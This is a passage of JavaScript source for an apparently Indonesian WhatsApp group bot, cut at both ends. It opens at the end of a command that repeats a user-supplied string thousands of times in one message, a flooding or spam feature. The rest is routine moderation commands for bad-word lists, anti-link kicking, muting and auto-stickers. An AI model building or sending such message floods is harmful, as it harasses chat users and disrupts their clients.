${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q}`)
break

case 'antibadword':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isBadword) return textImg(`Udah aktif`)
grupbadword.push(from)
fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
textImg(`Sukses mengaktifkan fitur anti badword di grup ini, kirim ${prefix}listbadword untuk melihat list badword`)
} else if (args[1].toLowerCase() === '0'){
let anu = grupbadword.indexOf(from)
grupbadword.splice(anu, 1)
fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
textImg('Fitur anti badword berhasil dinonaktifkan')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'listbadword':
let bi = `List badword

`
for (let boo of badword){
bi += `- ${boo}
`
}
bi += `
Total : ${badword.length}`
reply(bi)
break
case 'addbadword':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return textImg(`masukkan kata`)
if (isKasar(args[1].toLowerCase(), badword)) return textImg(`Udah ada`)
addBadword(args[1].toLowerCase(), badword)
textImg(`Sukses`)
break
case 'delbadword':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return textImg(`masukkan kata`)
if (!isKasar(args[1].toLowerCase(), badword)) return textImg(`Ga ada`)
delBadword(args[1].toLowerCase(), badword)
textImg(`Sukses`)
break
case 'clearbadword':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return textImg(`tag atau nomor`)
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
delCountKasar(mentioned[i], _senbadword)
}
reply('Sukses')
} else {
delCountKasar(args[1] + '@s.whatsapp.net', _senbadword)
reply('Sukses')
}
break

case 'delcountkasar':
//if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
delCountKasar(sender, _senbadword)
textImg(`Count kasar kamu berhasil dikurangi 1`)
break

case 'antiwibu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (isMuted) return
if (!isGroup) return reply(mess.OnlyGrup)
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isLelah) return textImg(`Udah aktif`)
grupcapek.push(from)
fs.writeFileSync('./database/grupcapek.json', JSON.stringify(grupcapek))
textImg(`Sukses mengaktifkan fitur anti wibu di grup ini`)
} else if (args[1].toLowerCase() === '0'){
let anu = grupcapek.indexOf(from)
grupcapek.splice(anu, 1)
fs.writeFileSync('./database/grupcapek.json', JSON.stringify(grupcapek))
textImg('Sukses menonaktifkan fitur anti wibu di grup ini')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break
case 'listwibu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let bin = `List Kata Wibu

`
for (let boo of lelah){
bin += `- ${boo}
`
}
bin += `
Total : ${lelah.length}`
reply(bin)
break
case 'addwibu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (args.length < 2) return textImg(`masukkan kata`)
if (isCapek(args[1].toLowerCase(), lelah)) return textImg(`Udah ada`)
addLelah(args[1].toLowerCase(), lelah)
textImg(`Sukses`)
break
case 'delwibu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (args.length < 2) return textImg(`masukkan kata`)
if (!isCapek(args[1].toLowerCase(), lelah)) return textImg(`Ga ada yank`)
delLelah(args[1].toLowerCase(), lelah)
textImg(`Sukses`)
break
case 'clearwibu': case 'bersihkanwibu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return textImg(`tag atau nomor`)
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
delCountCapek(mentioned[i], sencapek)
}
reply('Sukses')
} else {
delCountCapek(args[1] + '@s.whatsapp.net', sencapek)
reply('Sukses')
}
break
case 'mute':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return textImg(`udah mute`)
mute.push(from)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
textImg(`Bot berhasil dimute di chat ini`)
break

case 'antilink': case 'antisemualink':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`Pilih enable atau disable`)
if (args[1].toLowerCase() === '1'){
if (isAntiLink) return textImg(`Udah aktif`)
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
textImg('Berhasil mengaktifkan fitur anti link di grup ini')
textImg(`*Note :*\n\n*Jangan kirim Link atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
textImg('*Anti Link NonAktif*')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break

case 'antilinkgrup': case 'antilinkgc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner && !isOwner2) return reply(mess.GrupAdmin)
//if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`Pilih enable atau disable`)
if (args[1].toLowerCase() === '1'){
if (isAntiLinkGrup) return textImg(`Udah aktif`)
antilinkgrup.push(from)
fs.writeFileSync('./database/antilinkgrup.json', JSON.stringify(antilinkgrup))
textImg('Sukses menonaktifkan fitur Antilinkgrup di grup ini')
textImg(`*Note :*\n\n*Jangan kirim Link Group atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antilinkgrup.indexOf(from)
antilinkgrup.splice(anu, 1)
fs.writeFileSync('./database/antilinkgrup.json', JSON.stringify(antilinkgrup))
textImg('Sukses menonaktifkan antilinkgrup')
} else {
textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
}
break

case 'autocolong': case 'autocopas':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAutoColong) return textImg(`Udah aktif`)
autocolong.push(from)
fs.writeFileSync('./database/autocolong.json', JSON.stringify(autocolong))
textImg('Sukses mengaktifkan fitur AutoColong di grup ini')
} else if (args[1].toLowerCase() === '0'){
let anu = autocolong.indexOf(from)
autocolong.splice(anu, 1)
fs.writeFileSync('./database/autocolong.json', JSON.stringify(autocolong))
textImg('Sukses menonaktifkan fitur AutoColong di grup ini')
} else {
}
break

case 'autosticker': case 'autostiker':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAutoSticker) return textImg(`Udah aktif`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
textImg('Sukses mengaktifkan fitur AutoSticker di grup ini')
} else if (args[1].toLowerCase() === '0'){
let anu = autosticker.indexOf(from)
autosticker.splice(anu, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
textImg('Sukses menonaktifkan fitur AutoSticker di grup ini')
} else {
}
break
case 'antitagsurya': case 'ats':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (args.length === 1) return textImg(`*Format salah!*\n\nContoh : ${command} 1\n1 untuk mengaktifkan\n0 untuk menonaktifkan`)
if (args[1].toLowerCase() === '1'){
if (isAntiTagSurya) return textImg(`Udah aktif`)
antitagsurya.push(from)
fs.writeFileSync('./database/antitagsurya.json', JSON.stringify(antitagsurya))
textImg('Berhasil mengaktifkan fitur anti tag surya di group ini')
textImg(`*Note :*\n\n*Jangan tag tag ᴹᴿ᭄𝑺𝒖𝒓𝒚𝒂ㄙ×፝֟͜× atau kamu akan saya kick!*`)
} else if (args[1].toLowerCase() === '0'){
let anu = antitagsurya.indexOf(from)
antitagsurya.splice(anu, 1)
